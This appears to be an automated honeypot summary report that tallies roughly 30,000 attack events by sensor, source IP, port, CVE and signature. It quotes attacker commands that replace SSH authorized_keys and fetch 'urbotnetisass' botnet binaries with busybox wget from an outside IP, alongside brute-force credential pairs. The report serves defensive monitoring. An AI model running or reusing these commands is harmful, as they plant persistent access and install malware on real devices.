
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-15T13:01:45Z
**Timeframe:** 2025-10-15T12:20:01Z to 2025-10-15T13:00:02Z
**Files Used:**
- agg_log_20251015T122001Z.json
- agg_log_20251015T124001Z.json
- agg_log_20251015T130002Z.json

## Executive Summary
This report summarizes 29,980 malicious events captured by the honeypot network. The majority of attacks were detected by the Suricata and Heralding honeypots. The most prominent attack vector was VNC authentication attempts from the IP address 45.134.26.47. A significant number of attempts to exploit the DoublePulsar backdoor were also observed. Attackers frequently attempted to download and execute malicious binaries with filenames such as `arm.urbotnetisass`.

## Detailed Analysis

### Attacks by Honeypot
- Suricata: 10,095
- Heralding: 9,925
- Cowrie: 3,715
- Honeytrap: 2,484
- Sentrypeer: 2,228
- Ciscoasa: 1,217
- Dionaea: 153
- Miniprint: 38
- Redishoneypot: 36
- Mailoney: 30
- Tanner: 25
- H0neytr4p: 19
- Adbhoney: 9
- ElasticPot: 2
- ConPot: 2
- Ipphoney: 1
- Honeyaml: 1

### Top Attacking IPs
- 45.134.26.47
- 10.208.0.3
- 10.17.0.5
- 202.4.105.82
- 185.243.5.121
- 206.191.154.180
- 10.140.0.3
- 46.32.178.94
- 122.114.241.136
- 172.86.95.115

### Top Targeted Ports/Protocols
- vnc/5900
- 5060
- TCP/445
- 22
- 5903
- 8333
- UDP/5060
- 5909
- 9093
- 5908

### Most Common CVEs
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-2019-11500
- CVE-2021-3449

### Commands Attempted by Attackers
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cat /proc/cpuinfo | grep name | wc -l
- uname -a
- whoami
- busybox wget http://94.154.35.154/arm.urbotnetisass; ...
- rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; ...

### Signatures Triggered
- ET INFO VNC Authentication Failure
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET INFO Reserved Internal IP Traffic
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET VOIP Modified Sipvicious Asterisk PBX User-Agent
- ET VOIP Possible Inbound VOIP Scan/Misuse With User-Agent Zoiper
- ET SCAN Potential SSH Scan
- ET DROP Spamhaus DROP Listed Traffic Inbound

### Users / Login Attempts
- 345gs5662d34/345gs5662d34
- root/3245gs5662d34
- blank/raspberry
- guest/guest1234567
- root/190914
- user/user2021
- config/4444
- ftpuser/ftppassword
- blank/p@ssword
- root/789456
- admin/admin2019

### Files Uploaded/Downloaded
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- boatnet.arm7
- boatnet.arm5
- boatnet.arm6
- boatnet.arm
- fonts.gstatic.com
- css?family=Libre+Franklin...
- ie8.css?ver=1.0
- html5.js?ver=3.7.3

### HTTP User-Agents
- No user agents recorded.

### SSH Clients
- No SSH clients recorded.

### SSH Servers
- No SSH servers recorded.

### Top Attacker AS Organizations
- No attacker AS organizations recorded.

## Key Observations and Anomalies
- The high number of VNC authentication failures from a single IP (45.134.26.47) suggests a targeted brute-force attack.
- The presence of DoublePulsar-related signatures indicates attempts to exploit systems that may have been compromised by the FuzzBunch exploit kit.
- The variety of downloaded binaries for different architectures (ARM, x86, MIPS) suggests that attackers are attempting to compromise a wide range of IoT devices.
- A number of commands are focused on establishing persistence, such as by adding a new SSH key to `authorized_keys`.
